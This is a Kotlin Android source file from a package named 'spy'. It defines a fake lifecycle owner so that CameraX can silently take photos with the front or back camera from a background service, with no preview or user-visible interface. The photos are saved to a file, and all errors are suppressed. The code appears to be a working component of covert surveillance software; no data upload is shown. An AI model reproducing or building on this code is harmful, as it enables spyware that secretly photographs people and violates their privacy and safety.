package com.venice.spy

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Size
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class ServiceLifecycleOwner : LifecycleOwner {
    private val reg = LifecycleRegistry.createUnsafe(this)
    override val lifecycle: Lifecycle get() = reg
    fun resume() { reg.currentState = Lifecycle.State.RESUMED }
}

object Cam {
    private val exec = Executors.newSingleThreadExecutor()
    private val main = Handler(Looper.getMainLooper())

    fun capture(ctx: Context, out: File, front: Boolean = false): Boolean = try {
        val provider = ProcessCameraProvider.getInstance(ctx).get(20, TimeUnit.SECONDS)
        val owner = ServiceLifecycleOwner()
        val sel = if (front && provider.hasCamera(CameraSelector.DEFAULT_FRONT_CAMERA))
            CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA
        val cap = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .build()

        val latch = CountDownLatch(1)
        var ok = false
        main.post {
            try {
                owner.resume()
                provider.unbindAll()
                provider.bindToLifecycle(owner, sel, cap)
                cap.takePicture(
                    ImageCapture.OutputFileOptions.Builder(out).build(), exec,
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(r: ImageCapture.OutputFileResults) {
                            ok = true; latch.countDown()
                        }
                        override fun onError(e: ImageCaptureException) {
                            latch.countDown()
                        }
                    })
            } catch (e: Exception) { latch.countDown() }
        }
        latch.await(25, TimeUnit.SECONDS)
        main.post { try { provider.unbindAll() } catch (_: Exception) {} }
        ok && out.exists() && out.length() > 0
    } catch (e: Exception) { false }
}